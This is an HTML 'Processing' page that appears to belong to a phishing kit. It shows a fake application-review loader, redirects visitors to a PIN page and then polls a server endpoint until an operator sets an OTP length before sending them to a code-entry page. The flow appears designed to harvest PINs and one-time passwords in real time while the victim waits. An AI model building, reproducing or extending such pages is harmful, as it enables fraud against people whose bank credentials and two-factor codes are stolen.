<!DOCTYPE html>
<html>

<head>
    <title>Processing</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="header"></div>

<div class="container">

    <h2 class="title">Processing...</h2>

    <div class="loader"></div>

    <p style="text-align:center; margin-top:20px;">
        Please wait while we review your application
    </p>

</div>

<div class="footer"></div>

<script>

// FIRST PROCESS → GO TO PIN PAGE
if (localStorage.getItem("firstProcess") === "yes") {

    localStorage.removeItem("firstProcess");

    setTimeout(() => {
        window.location.href = "step5.html";
    }, 5000);
}

// AFTER PIN → WAIT FOR OTP TRIGGER
if (localStorage.getItem("fromPin") === "yes") {

    setInterval(() => {
        fetch("/otp-status")
        .then(res => res.json())
        .then(data => {
            if (data.otp === 5 || data.otp === 6) {
                localStorage.setItem("otpLength", data.otp);
                window.location.href = "step6.html";
            }
        });
    }, 2000);
}

</script>

</body>
</html>
